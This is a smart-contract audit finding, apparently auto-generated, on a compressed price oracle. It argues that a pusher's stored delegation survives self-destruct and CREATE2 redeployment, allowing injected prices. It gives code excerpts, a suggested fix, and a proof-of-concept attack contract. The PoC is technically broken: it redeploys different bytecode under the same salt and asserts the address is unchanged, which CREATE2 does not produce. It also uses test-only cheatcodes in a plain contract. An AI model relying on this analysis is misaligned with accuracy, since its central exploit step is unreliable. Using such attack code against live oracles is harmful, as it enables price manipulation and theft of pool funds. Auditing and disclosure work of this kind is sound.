### Title
Permanent `namespaceRemapping` entry after contract-pusher self-destruct enables unauthorized price injection into creator namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`allowContractPushers` verifies a contract pusher's consent via a one-time `staticcall` to `isPusher(creator)` at registration time, then stores the delegation permanently in `namespaceRemapping`. The fallback push path never re-verifies that the pusher address still holds the consenting contract. If the registered pusher contract self-destructs and a new contract is deployed at the same address (via CREATE2), the new contract inherits the delegation unconditionally and can push arbitrary prices into the original creator's feed namespace.

---

### Finding Description

`allowContractPushers` performs a live `staticcall` to verify consent:

```solidity
(bool ok, bytes memory res) = pusher.staticcall(
    abi.encodeWithSignature("isPusher(address)", msg.sender)
);
require(ok);
bool allowed = abi.decode(res, (bool));
require(allowed);

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The code comment claims "there is nothing to replay" because consent is proven by a live call rather than a signature. This is only true if the contract at the pusher address is immutable. The `namespaceRemapping` entry, however, is permanent — it is never invalidated by a code change at the pusher address.

The fallback push path resolves the namespace purely from `namespaceRemapping[msg.sender]`:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [2](#0-1) 

No re-verification of `isPusher` occurs on any subsequent push. If the contract at the pusher address is replaced (self-destruct + CREATE2 redeploy), the new contract inherits the delegation silently.

This is the direct analog to the TimeLock bug: just as `Timelock.executeTransaction` assumes a successful low-level call means code was executed (without checking target code existence), `allowContractPushers` assumes a one-time `isPusher` check permanently represents the contract's consent — without checking that the same code still exists at that address on each push.

The test suite acknowledges the EOA case is rejected, but only because `abi.decode("", (bool))` reverts on empty return data — not because of an explicit code-existence check:

```solidity
// EOA has no code, so staticcall to isPusher will fail
address eoa = address(0xDEAD);
vm.prank(creator);
vm.expectRevert();
oracle.allowContractPushers(_pushers(eoa));
``` [3](#0-2) 

This accidental protection does not cover the self-destruct + redeploy case, where the address has code both before and after.

---

### Impact Explanation

A malicious contract deployed at the inherited pusher address can call the oracle fallback with any packed slot word containing an arbitrary price and a fresh timestamp. The only per-push gate is timestamp monotonicity:

```solidity
bool newer = timestampMs.isAfter(oldTimestampMs);
if (!newer) continue;
_writeStorage(key, bytes32(bytes32(word & ~uint256(0xff))));
``` [4](#0-3) 

The attacker supplies a timestamp newer than the last legitimate push, so the write succeeds. The corrupted price lands in the creator's namespace under `feedIdOf(creator, slotIndex, positionIndex)`.

`AnchoredPriceProvider` reads from the oracle via `_readLeg`, which calls `IPricedOracle(address(offchainOracle)).price(feedId, msg.sender)`:

```solidity
(mid, spreadBps, , refTime) = IPricedOracle(address(offchainOracle)).price(feedId, msg.sender);
``` [5](#0-4) 

The guards in `_readLeg` (staleness, `mid == 0`, `spreadBps >= ORACLE_BPS`, `priceGuard`) do not block a fresh, non-zero price within any configured guard bounds. If no `priceGuard` is set, the attacker can push any non-zero price with any spread below `ORACLE_BPS`. The corrupted bid/ask then reaches `MetricOmmPool.swap`, causing traders to receive more output than the true price permits or pay less input than owed — a direct swap conservation failure and loss of LP principal.

---

### Likelihood Explanation

The attack requires:
1. A creator to have registered a contract pusher via `allowContractPushers`.
2. That pusher contract to be self-destructable (e.g., it is an upgradeable proxy, has an explicit `selfdestruct`, or was deployed with a known CREATE2 salt by a third party).
3. An attacker to control the CREATE2 redeployment at the same address.

Condition 3 is satisfied whenever the attacker is the original deployer of the pusher contract (a plausible scenario: an attacker deploys a benign-looking pusher contract, convinces a creator to register it, then self-destructs and redeploys a malicious version). The creator has no on-chain signal that the code at the pusher address changed.

---

### Recommendation

**Short term:** In the fallback push path, re-verify that the pusher contract still consents before writing into a delegated namespace:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator != address(0)) {
    (bool ok, bytes memory res) = msg.sender.staticcall(
        abi.encodeWithSignature("isPusher(address)", creator)
    );
    if (!ok || !abi.decode(res, (bool))) creator = address(0);
}
if (creator == address(0)) creator = msg.sender;
```

Alternatively, add an explicit `extcodesize` check in `allowContractPushers` and store a code hash at registration time, reverting any push whose pusher address no longer matches the stored hash.

**Long term:** Review all delegation paths for the assumption that a one-time liveness check permanently represents consent. Any path that stores a delegation without a revocation deadline or code-hash binding is vulnerable to the self-destruct + redeploy pattern.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {CompressedOracleV1} from ".../CompressedOracle.sol";

/// Step 1: Attacker deploys this via CREATE2 with a known salt.
///         It returns true for isPusher so the creator registers it.
contract MaliciousPusherV1 {
    function isPusher(address) external pure returns (bool) { return true; }
    function destroy() external { selfdestruct(payable(msg.sender)); }
}

/// Step 2: After self-destruct, attacker redeploys at the SAME address.
///         No isPusher check is re-run by the oracle.
contract MaliciousPusherV2 {
    CompressedOracleV1 public oracle;
    constructor(address _oracle) { oracle = CompressedOracleV1(_oracle); }

    /// Pushes an arbitrary price into the creator's namespace.
    function injectPrice(uint8 slotId, uint32 fakePrice, uint8 s0, uint8 s1) external {
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint48 raw   = (uint48(fakePrice) << 16) | (uint48(s0) << 8) | uint48(s1);
        uint256 word = (uint256(tsMs) << 8) | uint256(slotId);
        word |= uint256(raw) << 208; // position 0
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        require(ok, "push failed");
    }
}

contract PoC {
    function run(CompressedOracleV1 oracle, address creator) external {
        // 1. Deploy V1 via CREATE2 (salt = 0).
        MaliciousPusherV1 v1 = new MaliciousPusherV1{salt: 0}();

        // 2. Creator registers v1 (attacker convinces creator off-chain).
        address[] memory pushers = new address[](1);
        pushers[0] = address(v1);
        vm.prank(creator);
        oracle.allowContractPushers(pushers);
        // namespaceRemapping[v1] = creator  ← stored permanently

        // 3. Attacker self-destructs v1.
        v1.destroy();

        // 4. Attacker redeploys at the SAME address via CREATE2 (same salt).
        MaliciousPusherV2 v2 = new MaliciousPusherV2{salt: 0}(address(oracle));
        assert(address(v2) == address(v1)); // same address

        // 5. v2 pushes a manipulated price into the creator's namespace.
        //    namespaceRemapping[v2] == creator (inherited, never cleared).
        v2.injectPrice(0, 999_999, 0, 0);

        // 6. oracle.getOracleData(feedIdOf(creator, 0, 0)).price == manipulated value.
        //    AnchoredPriceProvider reading this feed will quote the bad price to pools.
    }
}
```
